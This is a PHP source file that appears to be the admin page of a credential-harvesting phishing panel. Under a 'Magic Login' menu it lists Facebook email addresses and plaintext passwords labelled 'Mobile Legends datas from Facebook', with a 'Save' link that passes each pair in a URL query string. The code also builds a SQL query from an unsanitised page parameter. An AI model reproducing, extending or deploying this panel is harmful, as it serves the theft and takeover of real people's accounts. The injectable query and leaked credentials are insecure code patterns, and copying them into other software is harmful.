<?php 
require __DIR__ . '/../f.php';

//$dataPerPage = 10;
$totalData = count(dbquery("SELECT * FROM fbdata"));
$pages = ceil($totalData / $dataPerPage);
if(isset($_GET['pg'])){
  $page = $_GET['pg'];
} else {$page = 1;}
$firstData = ($dataPerPage * $page) - $dataPerPage;

$fbdata = dbquery("SELECT * FROM fbdata LIMIT $firstData, $dataPerPage");
 ?>

<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Admin Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <style type="text/css">
    @import url(http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css);
    body{margin-top:20px;}
    .fa-fw {width: 2em;}
    </style>
    <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="//netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
    <script type="text/javascript">
        window.alert = function(){};
        var defaultCSS = document.getElementById('bootstrap-css');
        function changeCSS(css){
            if(css) $('head > link').filter(':first').replaceWith('<link rel="stylesheet" href="'+ css +'" type="text/css" />'); 
            else $('head > link').filter(':first').replaceWith(defaultCSS); 
        }
        $( document ).ready(function() {
          var iframe_height = parseInt($('html').height()); 
          window.parent.postMessage( iframe_height, 'https://bootsnipp.com');
        });
    </script>
    <link rel="stylesheet" type="text/css" href="/panel/css/style.css">
    <link rel="icon" type="image/png" href="/panel/res/favicon.png"/>
</head>
<body>
<div class="page-container">
  
    <!-- top navbar -->
    <div class="navbar navbar-default navbar-fixed-top" role="navigation">
       <div class="container">
        <div class="navbar-header">
           <a class="navbar-brand" href="/panel/index.php">Arya's Web Panel</a>
           <button type="button" class="navbar-toggle" data-toggle="offcanvas" data-target=".sidebar-nav">
             <span class="icon-bar"></span>
             <span class="icon-bar"></span>
             <span class="icon-bar"></span>
           </button>
        </div>
       </div>
    </div>
      
    <div class="container">
      <div class="row row-offcanvas row-offcanvas-left">
        
        <!-- sidebar -->
        <div class="col-xs-6 col-sm-3 sidebar-offcanvas" id="sidebar" role="navigation">
            <ul class="nav">
              <li class="active"><a href="/panel/">Home</a></li>
              <li><a href="/panel/magiclogin/">Magic Login</a></li>
              <li><a href="/panel/logout.php">Logout</a></li>           
            </ul>
        </div>
    
        <!-- main area -->
        <div class="col-xs-12 col-sm-9">
          <div class="col-md-10 well">
           <a href="/panel/index.php">Admin Panel</a> / <a href="/panel/magiclogin">Magic Login</a> / Facebook
        </div><br>

        <!-- PUT YOUR CONTENTS FROM HERE -->
          <div class="col-md-10">
          <b>Mobile Legends datas from Facebook</b> <br><br>
            <table class="table table-striped">
              <?php foreach ($fbdata as $fbdatas): ?>
                <?php 
                $em = $fbdatas['email'];
                $pw = $fbdatas['password'];
                 ?>
                <tr><td><?=$fbdatas['email']?><br><?=$fbdatas['password']?> - 
                  <a href="add-ml-p.php?<?="email=$em&password=$pw"?>" target="_blank">Save</a></td></tr>
              <?php endforeach; ?>
            </table>

            <ul class="pagination">
              <?php 
            if($page <= 1){
              echo '<li><a href="">Prev</a></li>';
            } else {
              $thispage = $page - 1;
              echo "<li><a href='?pg=$thispage'>Prev</a></li>";
            }
            for ($i=1; $i <= $pages ; $i++) { 
              if($i<>$page){
                echo "<li><a href='?pg=$i'>$i</a></li>";
              } else {
              echo "<li class='active'><a href=''>$i</a></li>";
            } 
          }
          if($page==$pages){
              echo "<li><a href=''>Next</a></li>";
            } else {
              $thispage = $page + 1;
              echo "<li><a href='?pg=$thispage'>Next</a></li>";
            }
           
             ?>
              <!-- <li><a href="#">1</a></li> -->
            </ul>

            
          </div>
          
        </div><!-- /.col-xs-12 main -->
    </div><!--/.row-->
  </div><!--/.container-->
</div><!--/.page-container-->
    <script type="text/javascript">
        $(document).ready(function() {
  $('[data-toggle=offcanvas]').click(function() {
    $('.row-offcanvas').toggleClass('active');
  });
});
    </script>
</body>
</html>